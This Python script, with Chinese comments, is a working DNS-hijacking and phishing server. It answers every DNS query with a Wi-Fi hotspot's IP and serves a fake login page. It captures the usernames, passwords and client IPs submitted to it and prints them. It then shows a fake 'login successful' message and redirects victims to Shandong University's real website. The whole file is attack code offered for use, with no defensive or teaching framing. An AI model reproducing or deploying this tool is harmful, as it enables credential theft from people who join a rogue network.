from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
from datetime import datetime
import json
import os
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer
import threading

CREDENTIALS_FILE = "credentials.json"


class FakeDNS:
    def resolve(self, request, _):
        reply = request.reply()
        reply.add_answer(RR(str(request.q.qname), rdata=A("192.168.137.1")))  # 你的热点IP
        return reply


def start_dns_server():
    DNSServer(FakeDNS(), port=53).start()


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Cache-Control", "no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.end_headers()
        with open("index.html", "rb") as f:
            self.wfile.write(f.read())

    def do_POST(self):
        if self.path == "/submit":
            try:
                # 1. 读取并解析POST数据
                content_length = int(self.headers["Content-Length"])
                post_data = self.rfile.read(content_length).decode("utf-8")
                data = urllib.parse.parse_qs(post_data)

                # 2. 保存凭证（确保这部分代码无错误）
                credential = {
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "username": data.get("username", [""])[0],
                    "password": data.get("password", [""])[0],
                    "ip": self.client_address[0]
                }
                self._save_credential(credential)
                print(f"[+] 捕获凭证: {credential['username']}:{credential['password']}")

                # 3. 返回跳转页面（关键修复：使用encode()转为字节）
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write("""
                <!DOCTYPE html>
                <html>
                <head>
                    <meta http-equiv="refresh" content="3;url=https://www.sdu.edu.cn">
                </head>
                <body>
                    <h1 style="text-align:center;">登录成功，正在跳转...</h1>
                </body>
                </html>
                """.encode('utf-8'))  # 显式转换为UTF-8编码的bytes
            except Exception as e:
                print(f"[!] POST处理错误: {e}")
                self.send_error(500)

    def _save_credential(self, credential):
        # 原保存逻辑不变
        pass


def run_server():
    threading.Thread(target=start_dns_server, daemon=True).start()
    server = HTTPServer(("192.168.137.1", 80), RequestHandler)  # 监听80端口
    print("[*] DNS劫持+钓鱼服务器已启动 (IP: 192.168.137.1)")
    server.serve_forever()


if __name__ == "__main__":
    run_server()